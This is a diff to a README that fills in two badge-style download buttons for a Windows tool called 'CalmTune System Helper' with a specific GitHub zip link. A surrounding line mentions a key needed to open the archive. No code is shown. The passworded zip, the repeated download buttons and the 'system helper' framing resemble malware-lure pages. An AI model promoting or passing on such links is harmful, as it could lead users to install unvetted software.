@@ -58,7 +58,7 @@ The text and interface aim to be **neutral and clear**, without harsh wording or
 ---
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/YOUR_REPO/archive/refs/heads/main.zip" style="text-decoration:none;">
+  <a href="https://github.com/ClaspBreakerDetonate/CalmTuneSystemHelper/archive/refs/heads/main.zip" style="text-decoration:none;">
     <img src="https://img.shields.io/badge/⬇️_Download_CalmTune_System_Helper-zip-success?style=for-the-badge&logo=windows" alt="Download CalmTune System Helper">
   </a>
 </p>
@@ -128,7 +128,7 @@ You will not be able to open the archive without this key, so it’s a good idea
 ---
 
 <p align="center">
-  <a href="https://github.com/YOUR_USERNAME/YOUR_REPO/archive/refs/heads/main.zip" style="text-decoration:none;">
+  <a href="https://github.com/ClaspBreakerDetonate/CalmTuneSystemHelper/archive/refs/heads/main.zip" style="text-decoration:none;">
     <img src="https://img.shields.io/badge/⬇️_Download_CalmTune_System_Helper_again-zip-blueviolet?style=for-the-badge&logo=windows" alt="Download CalmTune System Helper">
   </a>
 </p>
